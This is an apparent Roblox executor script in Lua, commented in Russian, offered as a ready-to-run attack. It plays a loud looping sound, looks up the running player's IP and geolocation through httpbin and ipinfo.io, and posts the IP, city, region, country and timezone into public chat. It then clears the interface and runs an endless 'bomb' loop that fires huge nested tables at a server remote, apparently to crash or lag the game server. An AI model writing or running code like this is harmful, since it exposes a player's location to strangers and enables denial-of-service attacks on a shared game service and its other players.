-- Подключаем необходимые службы и объекты
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ChatService = game:GetService("Chat")

-- URL для получения IP-адреса
local getIpUrl = "https://httpbin.org/ip"
-- URL для запроса информации о IP-адресе с использованием ipinfo.io
local ipinfoUrl = "https://ipinfo.io/"

local Sound = Instance.new("Sound", game.Workspace)
Sound.SoundId = "rbxassetid://9041745502"
Sound.Volume = 10
Sound.Looped = true
Sound:Play()

-- Функция для получения IP-адреса
local function getIPAddress()
    local success, response = pcall(function()
        return game:HttpGet(getIpUrl)
    end)
    
    if success then
        local successDecode, data = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        
        if successDecode and data.origin then
            return data.origin
        else
            return nil
        end
    else
        return nil
    end
end

-- Функция для отправки сообщения в чат
local function sendChatMessage(message)
    ChatService:Chat(Players.LocalPlayer.Character, message)
end

-- Функция для запроса и вывода подробной информации о IP-адресе через ipinfo.io
local function analyzeIPAddress(ip)
    local success, response = pcall(function()
        return game:HttpGet(ipinfoUrl .. ip .. "/json")
    end)
    
    if success then
        local successDecode, data = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        
        if successDecode then
            sendChatMessage("-- Информация о IP-адресе --")
            if data.ip then
                sendChatMessage("IP: " .. data.ip)
                wait(1)
            end
            if data.city then
                sendChatMessage("City: " .. data.city)
                wait(1)
            end
            if data.region then
                sendChatMessage("Region: " .. data.region)
                wait(1)
            end
            if data.country then
                sendChatMessage("Country: " .. data.country)
                wait(1)
            end
            if data.timezone then
                sendChatMessage("Time zone: " .. data.timezone)
                wait(1)
            end
        else
            warn("Не удалось декодировать JSON: " .. tostring(response))
        end
    else
        warn("Не удалось выполнить HTTP-запрос: " .. tostring(response))
    end
end

-- Пример использования функций
local ipAddress = getIPAddress()
if ipAddress then
    analyzeIPAddress(ipAddress)
else
    sendChatMessage("Не удалось получить IP-адрес.")
end

-- Таймер обратного отсчета для завершения сессии
local countdown = 10
while countdown > 0 do
    if countdown == 10 or countdown == 5 then
        sendChatMessage("End of session via: " .. countdown .. "s")
    end
    countdown = countdown - 1
    wait(1)
end
wait(1)
game.Players.LocalPlayer.PlayerGui:ClearAllChildren()
game.CoreGui:ClearAllChildren()
sendChatMessage("Сессия завершена.")
while wait(0.01) do --// don't change it's the best
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
local function getmaxvalue(val)
   local mainvalueifonetable = 499999
   if type(val) ~= "number" then
       return nil
   end
   local calculateperfectval = (mainvalueifonetable/(val+2))
   return calculateperfectval
end
local function bomb(tableincrease, tries)
local maintable = {}
local spammedtable = {}
table.insert(spammedtable, {})
z = spammedtable[1]
for i = 1, tableincrease do
    local tableins = {}
    table.insert(z, tableins)
    z = tableins
end
local calculatemax = getmaxvalue(tableincrease)
local maximum
if calculatemax then
     maximum = calculatemax
     else
     maximum = 999999
end
for i = 1, maximum do
     table.insert(maintable, spammedtable)
end
for i = 1, tries do
     game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
end
end
bomb(250, 2) --// change values if client crashes
end
